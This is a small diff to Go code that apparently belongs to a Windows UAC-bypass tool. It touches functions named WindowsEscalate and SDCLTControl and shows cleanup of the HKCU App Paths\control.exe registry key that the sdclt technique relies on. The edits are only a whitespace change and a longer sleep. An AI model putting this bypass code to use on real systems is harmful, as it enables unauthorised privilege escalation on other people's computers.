@@ -37,7 +37,7 @@ func WindowsEscalate(path string) (err error) {
 		log.Println("computerdefaults")
 		return
 	}
-	
+
 	return errors.New("uac bypass failed")
 }
 
@@ -100,7 +100,7 @@ func SDCLTControl(path string) error {
 	if err != nil {
 		return err
 	}
-	time.Sleep(5 * time.Second)
+	time.Sleep(10 * time.Second)
 
 	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`)
 	if err != nil {
